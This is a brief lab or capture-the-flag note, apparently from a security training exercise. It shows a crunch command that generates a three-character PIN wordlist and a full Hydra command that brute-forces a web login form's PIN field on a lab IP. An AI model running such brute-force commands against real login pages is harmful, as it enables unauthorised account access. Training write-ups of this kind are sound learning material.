Day 3: Hydra
first we use [[Crunch]] to generate a wordlist of possible pins by using

`crunch 3 3 0123456789ABCDEF -o 3digits.txt`

The command above specifies the following:

- `3` the first number is the minimum length of the generated password
- `3` the second number is the maximum length of the generated password
- `0123456789ABCDEF` is the character set to use to generate the passwords
- `-o 3digits.txt` saves the output to the `3digits.txt` file

Using the List

analysing `http://10.10.145.239:8000/pin.php`
we can see that the pin is sent as a post ro login.php with the name pin

we can brute force thiis using  [[Hydra]] 

`hydra -l '' -P 3digits.txt -f -v 10.10.145.239 http-post-form "/login.php:pin=^PASS^:Access denied" -s 8000`
